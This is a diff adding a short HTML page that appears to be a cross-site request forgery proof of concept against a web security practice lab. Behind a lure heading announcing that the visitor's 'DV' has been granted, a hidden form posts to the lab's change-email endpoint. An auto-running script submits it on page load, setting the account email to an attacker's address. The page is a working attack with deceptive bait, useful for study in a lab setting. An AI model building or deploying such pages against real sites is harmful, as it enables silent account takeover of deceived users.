@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>HELLO RABIN CONGRULATIONS YOUR DV HAS BEEN GRANTED</h1>
+    <iframe style="display:none" name="csrf_frame" ></iframe>
+    <form action="https://0a33005f040a878c82ea0ba6000100a8.web-security-academy.net/my-account/change-email" method="POST" id="csrf_form" target="csrf_frame">
+      <input type="hidden" name="email" value="attacker@gmail.com">
+</form>
+<script>
+    document.getElementById('csrf_form').submit();
+</script>
+</body>
+
+</html>
